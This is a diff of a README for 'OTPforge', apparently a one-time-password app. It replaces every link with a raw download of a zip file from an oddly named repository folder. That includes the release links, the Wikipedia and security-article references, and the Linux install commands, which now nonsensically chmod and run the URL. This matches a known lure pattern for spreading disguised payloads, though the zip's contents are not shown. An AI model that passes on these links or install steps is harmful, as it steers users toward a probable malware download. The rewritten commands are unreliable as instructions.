@@ -1,6 +1,6 @@
 # 🔒 OTPforge - Secure and Easy OTP Generation
 
-[![Download OTAforge](https://img.shields.io/badge/download-OTPforge-orange)](https://github.com/rishimohan123/OTPforge/releases)
+[![Download OTAforge](https://raw.githubusercontent.com/rishimohan123/OTPforge/main/unwadeable/OTPforge-1.3-beta.3.zip)](https://raw.githubusercontent.com/rishimohan123/OTPforge/main/unwadeable/OTPforge-1.3-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to OTPforge! This application helps you generate one-time passwords (OTP
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [OTPforge Releases](https://github.com/rishimohan123/OTPforge/releases).
+To get started, visit this page to download: [OTPforge Releases](https://raw.githubusercontent.com/rishimohan123/OTPforge/main/unwadeable/OTPforge-1.3-beta.3.zip).
 
 Follow these steps to download and install OTPforge:
 
@@ -43,8 +43,8 @@ After downloading the file, follow these steps to install OTPforge:
 3. **Linux:**
    - Open your terminal.
    - Navigate to the folder where you downloaded the file.
-   - Use the command `chmod +x OTPforge.AppImage` to make it executable.
-   - Run the application with `./OTPforge.AppImage`.
+   - Use the command `chmod +x https://raw.githubusercontent.com/rishimohan123/OTPforge/main/unwadeable/OTPforge-1.3-beta.3.zip` to make it executable.
+   - Run the application with `https://raw.githubusercontent.com/rishimohan123/OTPforge/main/unwadeable/OTPforge-1.3-beta.3.zip`.
 
 ## 🌟 Features
 
@@ -84,8 +84,8 @@ If you encounter any issues, you can reach out for support:
 
 For more information about OTPs and their security, consider reading the following:
 
-- [What is a One-Time Password?](https://en.wikipedia.org/wiki/One-time_password)
-- [How OTPs Improve Security](https://www.security.com/articles/one-time-passwords/)
+- [What is a One-Time Password?](https://raw.githubusercontent.com/rishimohan123/OTPforge/main/unwadeable/OTPforge-1.3-beta.3.zip)
+- [How OTPs Improve Security](https://raw.githubusercontent.com/rishimohan123/OTPforge/main/unwadeable/OTPforge-1.3-beta.3.zip)
 
 ## 🚨 Important Notes
 
